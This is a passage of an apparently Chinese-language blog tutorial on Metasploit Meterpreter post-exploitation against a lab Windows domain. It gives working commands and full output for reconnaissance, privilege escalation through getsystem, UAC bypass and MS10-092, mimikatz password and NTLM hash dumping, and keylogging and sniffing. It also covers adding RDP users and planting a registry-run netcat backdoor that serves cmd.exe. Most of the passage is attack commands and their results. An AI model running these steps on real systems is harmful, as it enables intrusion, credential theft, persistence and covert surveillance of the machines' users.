class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Nmap scan report for bogon (192.168.130.129)</span><br><span class="line">Host is up (0.0027s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 118.08 seconds</span><br></pre></td></tr></table></figure><h2><span id="信息收集">信息收集</span></h2><p>信息收集的脚本较多，仅列几个常用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br><span class="line"></span><br><span class="line">[*] Checking if WIN-7 is a Virtual Machine .....</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br><span class="line">meterpreter &gt; run post/windows/gather/forensics/enum_drives</span><br><span class="line"></span><br><span class="line">Device Name:                    Type:   Size (bytes):</span><br><span class="line">------------                    -----   -------------</span><br><span class="line">&lt;Physical Drives:&gt;</span><br><span class="line">\\.\PhysicalDrive0                   4702111234474983745</span><br><span class="line">&lt;Logical Drives:&gt;</span><br><span class="line">\\.\C:                               4702111234474983745</span><br><span class="line">\\.\D:                               4702111234474983745</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WIN-7</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20181218215218_default_192.168.22.171_host.application_993878.txt</span><br><span class="line">meterpreter &gt; run post/windows/gather/dumplinks</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-7</span><br><span class="line">[*] Extracting lnk files for user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...</span><br><span class="line">[*] No Recent Office files found for user Administrator. Nothing to do.</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_domain</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: uknowsec</span><br><span class="line">[+] FOUND Domain Controller: WIN-0L310JHOGH6 (IP: 192.168.130.130)</span><br></pre></td></tr></table></figure><h2><span id="提权">提权</span></h2><h3><span id="getsystem提权">getsystem提权</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure><p><code>getsystem</code>工作原理：</p><ol><li><code>getsystem</code>创建一个新的<code>Windows</code>服务，设置为<code>SYSTEM</code>运行，当它启动时连接到一个命名管道。</li><li><code>getsystem</code>产生一个进程，它创建一个命名管道并等待来自该服务的连接。</li><li><code>Windows</code>服务已启动，导致与命名管道建立连接。</li><li>该进程接收连接并调用<code>ImpersonateNamedPipeClient</code>，从而为<code>SYSTEM</code>用户创建模拟令牌。</li><li>然后用新收集的<code>SYSTEM</code>模拟令牌产生<code>cmd.exe</code>，并且我们有一个<code>SYSTEM</code>特权进程。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br></pre></td></tr></table></figure><h3><span id="bypassuac">bypassuac</span></h3><p>内置多个<code>pypassuac</code>脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行<code>getsystem</code>获取系统权限，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:4444 </span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.22.170:4444 -&gt; 192.168.22.171:59068) at 2018-12-18 22:12:04 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; use exploit/windows/local/bypassuac_eventvwr </span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/bypassuac_eventvwr):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:4444 </span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[*] Configuring payload and stager registry keys ...</span><br><span class="line">[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe</span><br><span class="line">[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] Meterpreter session 4 opened (192.168.22.170:4444 -&gt; 192.168.22.171:59075) at 2018-12-18 22:25:01 -0500</span><br><span class="line">[*] Cleaning up registry keys ...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h3><span id="内核漏洞提权">内核漏洞提权</span></h3><p>可先利用<code>enum_patches</code>模块收集补丁信息，然后查找可用的<code>exploits</code>进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/ms10_092_schelevator </span><br><span class="line">msf exploit(windows/local/ms10_092_schelevator) &gt; set session 5</span><br><span class="line">session =&gt; 5</span><br><span class="line">msf exploit(windows/local/ms10_092_schelevator) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:4444 </span><br><span class="line">[*] Preparing payload at C:\Users\Win7\AppData\Local\Temp\IsamdcUIQQzv.exe</span><br><span class="line">[*] Creating task: lk6j4xdPvbMB</span><br><span class="line">[*] �ɹ�: �ɹ������ƻ����� &quot;lk6j4xdPvbMB&quot;��</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Reading the task file contents from C:\Windows\system32\tasks\lk6j4xdPvbMB...</span><br><span class="line">[*] Original CRC32: 0xd75a78d9</span><br><span class="line">[*] Final CRC32: 0xd75a78d9</span><br><span class="line">[*] Writing our modified content back...</span><br><span class="line">[*] Validating task: lk6j4xdPvbMB</span><br><span class="line">[*] ����: �޷���������Դ��</span><br><span class="line">[*] Disabling the task...</span><br><span class="line">[*] �ɹ�: �����˼ƻ����� &quot;lk6j4xdPvbMB&quot; �Ĳ�����</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Enabling the task...</span><br><span class="line">[*] �ɹ�: �����˼ƻ����� &quot;lk6j4xdPvbMB&quot; �Ĳ�����</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Executing the task...</span><br><span class="line">[*] �ɹ�: �������� &quot;lk6j4xdPvbMB&quot;��</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Deleting the task...</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] �ɹ�: �ƻ������� &quot;lk6j4xdPvbMB&quot; ���ɹ�ɾ����</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Meterpreter session 6 opened (192.168.22.170:4444 -&gt; 192.168.22.171:50044) at 2018-12-18 23:00:31 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h2><span id="mimikatz抓取密码">mimikatz抓取密码</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz </span><br><span class="line">Loading extension mimikatz...[!] Loaded x86 Mimikatz on an x64 architecture.</span><br><span class="line"></span><br><span class="line">[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7600).). Did you mean to &apos;load kiwi&apos; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID     Package    Domain        User           Password</span><br><span class="line">------     -------    ------        ----           --------</span><br><span class="line">0;4181124  NTLM       WIN-7         Administrator  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;362944   NTLM       WIN-7         Win7           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;362915   NTLM       WIN-7         Win7           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;996      Negotiate  UKNOWSEC      WIN-7$         mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;47330    NTLM                                    mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;999      Negotiate  UKNOWSEC      WIN-7$         mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : win-7.uknowsec.cn</span><br><span class="line">BootKey    : 3a0c900d7f8d17e229f42745cc605dfe</span><br><span class="line"></span><br><span class="line">Rid  : 500</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 45a524862326cb9e7d85af4017a000f0</span><br><span class="line"></span><br><span class="line">Rid  : 501</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">Rid  : 1001</span><br><span class="line">User : Win7</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure><h2><span id="远程桌面amp截屏">远程桌面&amp;截屏</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">set_desktop   #设置meterpreter关联的桌面  -h查看帮助</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br></pre></td></tr></table></figure><h2><span id="开启rdpamp添加用户">开启rdp&amp;添加用户</span></h2><h4><span id="getgui命令">getgui命令</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run getgui –h #查看帮助</span><br><span class="line">run getgui -e #开启远程桌面</span><br><span class="line">run getgui -u lltest2 -p 123456   #添加用户</span><br><span class="line">run getgui -f 6661 –e   #3389端口转发到6661</span><br></pre></td></tr></table></figure><ol><li><code>getgui</code> 系统不推荐，推荐使用<code>run post/windows/manage/enable_rdp</code></li><li><code>getgui</code>添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆</li></ol><h4><span id="enable_rdp脚本">enable_rdp脚本</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br></pre></td></tr></table></figure><p>脚本位于<code>/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb</code><br>通过<code>enable_rdp.rb</code>脚本可知：开启<code>rdp</code>是通过<code>reg</code>修改注册表；添加用户是调用<code>cmd.exe</code>通过<code>net user</code>添加；端口转发是利用的<code>portfwd</code>命令</p><h2><span id="键盘记录">键盘记录</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure><h2><span id="sniffer抓包">sniffer抓包</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer</span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces</span><br><span class="line"></span><br><span class="line">1 - &apos;WAN Miniport (Network Monitor)&apos; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</span><br><span class="line">2 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br><span class="line">3 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br></pre></td></tr></table></figure><h2><span id="注册表操作">注册表操作</span></h2><h3><span id="注册表基本命令">注册表基本命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg –h</span><br><span class="line">    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称</span><br><span class="line">    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据</span><br></pre></td></tr></table></figure><h3><span id="注册表设置nc后门">注册表设置nc后门</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line"></span><br><span class="line">nc -v 192.168.159.144 443  #攻击者连接nc后门</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 